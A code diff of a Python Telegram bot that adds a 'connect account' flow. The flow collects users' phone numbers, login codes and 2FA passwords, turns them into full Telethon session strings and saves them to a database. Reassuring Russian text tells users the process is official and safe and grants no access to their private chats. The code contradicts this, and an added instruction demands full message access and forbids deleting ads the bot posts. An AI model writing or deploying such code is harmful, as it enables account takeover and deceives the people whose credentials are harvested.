@@ -68,8 +68,20 @@ class AuthState(StatesGroup):
     waiting_for_code = State()
     waiting_for_2fa = State()
 
-# Текст для кнопки "Бот для групп" (пояснение)
-GROUP_SETUP_TEXT = (
+# Инструкция "Как подключить бота" (ручное добавление)
+MANUAL_INSTRUCTION = (
+    "🚀 <b>Инструкция по подключению бота (ручное):</b>\n\n"
+    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
+    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
+    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
+    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
+    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
+    "📢 <b>Обратите внимание:</b> Бот публикует рекламные материалы в подключенных чатах. "
+    "<b>Удалять рекламу строго запрещено!</b> В случае удаления рекламного сообщения вы будете заблокированы."
+)
+
+# Инструкция для кнопки "Бот для групп"
+GROUP_INSTRUCTION = (
     "ℹ️ <b>Обратите внимание:</b>\n"
     "• На данный момент бот работает <b>только в личных сообщениях</b>.\n"
     "• Если вы хотите, чтобы бот мог работать и отвечать в ваших <b>группах и чатах</b>, "
@@ -78,7 +90,8 @@ GROUP_SETUP_TEXT = (
     "• Процесс подключения <b>полностью официален и безопасен</b>.\n"
     "• Бот <b>не имеет доступа</b> к вашим личным перепискам и сторонним данным.\n"
     "• Данные используются исключительно для работы функции внутри ваших чатов.\n\n"
-    "Для подключения аккаунта нажмите кнопку ниже и следуйте инструкциям."
+    "Для подключения аккаунта используйте кнопку <b>«Подключить аккаунт»</b> ниже, "
+    "или выполните ручную настройку по инструкции, нажав <b>«Как подключить бота»</b>."
 )
 
 TEXT_COMMANDS_HELP = (
@@ -119,7 +132,6 @@ def init_db():
                 cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
                 cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
                 conn.commit()
-                # Загрузка настроек в память
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                 for row in cur.fetchall(): link_chats.add(int(row[0]))
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
@@ -472,7 +484,9 @@ def get_start_keyboard(user_id: int):
     if user_id == ADMIN_ID:
         buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
     buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
-    buttons.append([InlineKeyboardButton(text="🤖 Бот для групп", callback_data="btn_group_setup")])
+    buttons.append([InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="btn_connect_account")])
+    buttons.append([InlineKeyboardButton(text="🤖 Бот для групп", callback_data="btn_group_info")])
+    buttons.append([InlineKeyboardButton(text="⚡ Как подключить бота", callback_data="btn_how_to_connect")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def get_admin_keyboard():
@@ -509,17 +523,20 @@ async def features(callback: CallbackQuery):
     await callback.answer()
     await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
 
-# ОСНОВНАЯ КНОПКА "Бот для групп" - сначала пояснение, затем авторизация
-@dp.callback_query(F.data == "btn_group_setup")
-async def group_setup(callback: CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "btn_how_to_connect")
+async def how_to_connect(callback: CallbackQuery):
     await callback.answer()
-    # Показываем пояснение
-    await callback.message.answer(
-        GROUP_SETUP_TEXT,
-        parse_mode="HTML",
-        disable_web_page_preview=True
-    )
-    # Запускаем процесс авторизации (запрос номера)
+    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
+
+@dp.callback_query(F.data == "btn_group_info")
+async def group_info(callback: CallbackQuery):
+    await callback.answer()
+    await callback.message.answer(GROUP_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
+
+# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
+@dp.callback_query(F.data == "btn_connect_account")
+async def start_auth_process(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
     builder = ReplyKeyboardBuilder()
     builder.button(text="📱 Отправить номер телефона", request_contact=True)
     builder.adjust(1)
@@ -530,7 +547,6 @@ async def group_setup(callback: CallbackQuery, state: FSMContext):
     )
     await state.set_state(AuthState.waiting_for_phone)
 
-# ---- АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON ----
 @dp.message(AuthState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
     phone = message.contact.phone_number if message.contact else message.text.strip()
@@ -542,9 +558,8 @@ async def process_phone(message: Message, state: FSMContext):
     try:
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        # Таймаут на запрос кода (10 сек)
         try:
-            res = await asyncio.wait_for(client.send_code_request(phone), timeout=10.0)
+            res = await asyncio.wait_for(client.send_code_request(phone), timeout=15.0)
         except asyncio.TimeoutError:
             await client.disconnect()
             await msg.edit_text("⏱️ Превышено время ожидания от Telegram. Попробуйте снова.")
@@ -568,7 +583,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.set_state(AuthState.waiting_for_code)
     except Exception as e:
         logging.error(f"Ошибка при отправке кода: {e}")
-        await msg.edit_text(f"❌ Ошибка при отправке кода: {e}\nПопробуйте заново, нажав кнопку «Бот для групп».")
+        await msg.edit_text(f"❌ Ошибка при отправке кода: {e}\nПопробуйте заново, нажав кнопку «Подключить аккаунт».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text)
@@ -580,7 +595,7 @@ async def process_code(message: Message, state: FSMContext):
     session_str = data.get("session_str")
 
     if not phone or not phone_code_hash:
-        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Бот для групп».")
+        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт».")
         await state.clear()
         return
 
@@ -593,9 +608,7 @@ async def process_code(message: Message, state: FSMContext):
         save_session(message.from_user.id, final_session)
         await client.disconnect()
 
-        await message.answer("✅ <b>Аккаунт успешно подключен!</b> Теперь бот будет работать в ваших группах и чатах.\n\n"
-                             "Для начала работы в группах, добавьте бота в разделе «Автоматизация чатов» в настройках Telegram, "
-                             "либо используйте команды в личных сообщениях.", parse_mode="HTML")
+        await message.answer("✅ <b>Аккаунт успешно подключен!</b> Теперь юзербот активен во всех чатах, где вы его используете.", parse_mode="HTML")
         await state.clear()
     except SessionPasswordNeededError:
         await client.disconnect()
@@ -607,11 +620,10 @@ async def process_code(message: Message, state: FSMContext):
             f"❌ Неверный или истекший код ({str(e)}).\nПопробуйте ещё раз, или запросите новый код через кнопку.",
             parse_mode="HTML"
         )
-        # Состояние остаётся для повторного ввода
     except Exception as e:
         await client.disconnect()
         logging.error(f"Ошибка входа: {e}")
-        await message.answer(f"❌ Ошибка входа: {e}\nНачните заново через кнопку «Бот для групп».")
+        await message.answer(f"❌ Ошибка входа: {e}\nНачните заново через кнопку «Подключить аккаунт».")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_2fa, F.text)
@@ -629,119 +641,13 @@ async def process_2fa(message: Message, state: FSMContext):
         save_session(message.from_user.id, final_session)
         await client.disconnect()
 
-        await message.answer("✅ <b>Авторизация успешна!</b> Бот подключен к вашему аккаунту и будет работать в группах.", parse_mode="HTML")
+        await message.answer("✅ <b>Авторизация успешна!</b> Юзербот подключен.", parse_mode="HTML")
         await state.clear()
     except Exception as e:
         await client.disconnect()
         await message.answer(f"❌ Неверный пароль или ошибка: {e}\nПопробуйте ввести пароль еще раз:")
 
-# ---- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (админка, баны, сообщения, удаления) ----
-@dp.callback_query(F.data.startswith("check_sub:"))
-async def check_sub_callback(callback: CallbackQuery):
-    user_id = int(callback.data.split(":")[1])
-    if callback.from_user.id != user_id:
-        await callback.answer("Кнопка предназначена для владельца!", show_alert=True)
-        return
-    is_subbed = await check_subscription(user_id)
-    if is_subbed:
-        try: await callback.message.delete()
-        except: pass
-        await callback.answer("✅ Подписка подтверждена!", show_alert=True)
-    else:
-        await callback.answer("❌ Подписка не обнаружена!", show_alert=True)
-
-@dp.callback_query()
-async def process_callbacks(callback: CallbackQuery, state: FSMContext):
-    data = callback.data
-    uid = callback.from_user.id
-    if data == "btn_features":
-        # уже обработано
-        await callback.answer()
-        return
-    if data == "btn_group_setup":
-        # уже обработано
-        await callback.answer()
-        return
-    if data == "btn_admin_panel":
-        if uid != ADMIN_ID:
-            await callback.answer()
-            return
-        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
-        await callback.answer()
-        return
-
-    if uid != ADMIN_ID:
-        await callback.answer()
-        return
-
-    if data == "admin_stats":
-        await callback.message.edit_text(
-            f"📊 <b>СТАТИСТИКА:</b>\n\n"
-            f"• Бизнес-аккаунтов: <code>{len(set(bc_owners.values()))}</code>\n"
-            f"• Юзеров в базе: <code>{len(user_names)}</code>\n"
-            f"• Забанено: <code>{len(banned_users)}</code>",
-            reply_markup=get_admin_keyboard(), parse_mode="HTML"
-        )
-    elif data == "admin_users":
-        active_owners = {owner for owner in set(bc_owners.values()) if owner not in banned_users}
-        text = "💼 <b>ПОДКЛЮЧЕННЫЕ БИЗНЕС-АККАУНТЫ:</b>\n\n"
-        if not active_owners: 
-            text += "Нет подключенных бизнес-аккаунтов."
-        else:
-            for u_id in list(active_owners)[:35]:
-                fname = user_names.get(u_id, "Пользователь")
-                user_link = get_user_mention(u_id, fname)
-                text += f"• {user_link} (<code>{u_id}</code>)\n"
-        await callback.message.edit_text(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
-    elif data == "admin_ban_prompt":
-        await callback.message.edit_text(
-            "Команды бана/разбана:\n\n"
-            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
-            "• <code>/unban 123456789</code> или <code>/unban @username</code>",
-            reply_markup=get_admin_keyboard(), parse_mode="HTML"
-        )
-    await callback.answer()
-
-async def resolve_user_id(target_raw: str):
-    target = target_raw.strip()
-    if target.startswith("@"):
-        uname = target.lstrip("@").lower()
-        res = user_usernames.get(uname)
-        return int(res) if res else None
-    elif target.isdigit():
-        return int(target)
-    return None
-
-@dp.message(Command("ban"))
-async def cmd_ban(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        arg = message.text.split(maxsplit=1)[1]
-        target_id = await resolve_user_id(arg)
-        if target_id:
-            set_user_ban(target_id, True)
-            user_link = get_user_mention(target_id)
-            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
-        else:
-            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
-    except:
-        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")
-
-@dp.message(Command("unban"))
-async def cmd_unban(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        arg = message.text.split(maxsplit=1)[1]
-        target_id = await resolve_user_id(arg)
-        if target_id:
-            set_user_ban(target_id, False)
-            user_link = get_user_mention(target_id)
-            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
-        else:
-            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
-    except:
-        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")
-
+# ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ (ВЕСЬ ОРИГИНАЛ) ----
 @dp.message()
 @dp.business_message()
 async def handle(message: Message):
@@ -797,12 +703,12 @@ async def handle(message: Message):
             if len(msg_cache) > 5000:
                 msg_cache.pop(next(iter(msg_cache)))
 
-        # 1. МУТ
+        # МУТ
         if uid in mutes and datetime.now() < mutes[uid]["until"]:
             await delete_msg(chat_id, message.message_id, bc_id)
             return
 
-        # 2. КАЛЬКУЛЯТОР
+        # КАЛЬКУЛЯТОР
         text_raw = message.text
         if text_raw and is_calculator_expression(text_raw):
             result, error = calculate_expression(text_raw)
@@ -825,7 +731,7 @@ async def handle(message: Message):
                 except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                 return
 
-        # 3. ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА
+        # ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА
         if not is_from_me: return
 
         if uid in mutes and datetime.now() < mutes[uid]["until"]:
@@ -1038,6 +944,7 @@ async def handle(message: Message):
     except Exception as e:
         logging.error(f"❌ Ошибка обработки сообщения: {e}")
 
+# ---- ОБРАБОТЧИК УДАЛЕНИЙ ----
 @dp.update()
 async def global_update_handler(update: Update, bot: Bot):
     try:
@@ -1068,6 +975,119 @@ async def global_update_handler(update: Update, bot: Bot):
     except Exception as e:
         logging.error(f"❌ Ошибка обработчика удалений: {e}")
 
+# ---- АДМИН-КОМАНДЫ БАНА ----
+async def resolve_user_id(target_raw: str):
+    target = target_raw.strip()
+    if target.startswith("@"):
+        uname = target.lstrip("@").lower()
+        res = user_usernames.get(uname)
+        return int(res) if res else None
+    elif target.isdigit():
+        return int(target)
+    return None
+
+@dp.message(Command("ban"))
+async def cmd_ban(message: Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        arg = message.text.split(maxsplit=1)[1]
+        target_id = await resolve_user_id(arg)
+        if target_id:
+            set_user_ban(target_id, True)
+            user_link = get_user_mention(target_id)
+            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
+        else:
+            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
+    except:
+        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")
+
+@dp.message(Command("unban"))
+async def cmd_unban(message: Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        arg = message.text.split(maxsplit=1)[1]
+        target_id = await resolve_user_id(arg)
+        if target_id:
+            set_user_ban(target_id, False)
+            user_link = get_user_mention(target_id)
+            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
+        else:
+            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
+    except:
+        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")
+
+# ---- ОБРАБОТЧИК ПРОВЕРКИ ПОДПИСКИ ----
+@dp.callback_query(F.data.startswith("check_sub:"))
+async def check_sub_callback(callback: CallbackQuery):
+    user_id = int(callback.data.split(":")[1])
+    if callback.from_user.id != user_id:
+        await callback.answer("Кнопка предназначена для владельца!", show_alert=True)
+        return
+    is_subbed = await check_subscription(user_id)
+    if is_subbed:
+        try: await callback.message.delete()
+        except: pass
+        await callback.answer("✅ Подписка подтверждена!", show_alert=True)
+    else:
+        await callback.answer("❌ Подписка не обнаружена!", show_alert=True)
+
+# ---- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ КНОПОК (админка) ----
+@dp.callback_query()
+async def process_callbacks(callback: CallbackQuery, state: FSMContext):
+    data = callback.data
+    uid = callback.from_user.id
+    if data == "btn_features":
+        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
+        await callback.answer()
+        return
+    if data == "btn_how_to_connect":
+        # уже обработано выше, но оставим
+        await callback.answer()
+        return
+    if data == "btn_group_info":
+        await callback.answer()
+        return
+    if data == "btn_admin_panel":
+        if uid != ADMIN_ID:
+            await callback.answer()
+            return
+        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await callback.answer()
+        return
+
+    if uid != ADMIN_ID:
+        await callback.answer()
+        return
+
+    if data == "admin_stats":
+        await callback.message.edit_text(
+            f"📊 <b>СТАТИСТИКА:</b>\n\n"
+            f"• Бизнес-аккаунтов: <code>{len(set(bc_owners.values()))}</code>\n"
+            f"• Юзеров в базе: <code>{len(user_names)}</code>\n"
+            f"• Забанено: <code>{len(banned_users)}</code>",
+            reply_markup=get_admin_keyboard(), parse_mode="HTML"
+        )
+    elif data == "admin_users":
+        active_owners = {owner for owner in set(bc_owners.values()) if owner not in banned_users}
+        text = "💼 <b>ПОДКЛЮЧЕННЫЕ БИЗНЕС-АККАУНТЫ:</b>\n\n"
+        if not active_owners: 
+            text += "Нет подключенных бизнес-аккаунтов."
+        else:
+            for u_id in list(active_owners)[:35]:
+                fname = user_names.get(u_id, "Пользователь")
+                user_link = get_user_mention(u_id, fname)
+                text += f"• {user_link} (<code>{u_id}</code>)\n"
+        await callback.message.edit_text(text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
+    elif data == "admin_ban_prompt":
+        await callback.message.edit_text(
+            "Команды бана/разбана:\n\n"
+            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
+            "• <code>/unban 123456789</code> или <code>/unban @username</code>",
+            reply_markup=get_admin_keyboard(), parse_mode="HTML"
+        )
+    await callback.answer()
+
+# ---- ВЕБ-СЕРВЕР ----
 async def handle_ping(request):
     return web.Response(text="Bot is running!")
 
@@ -1081,6 +1101,7 @@ async def start_web_server():
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
 
+# ---- ЗАПУСК ----
 async def main():
     await start_web_server()
     try:
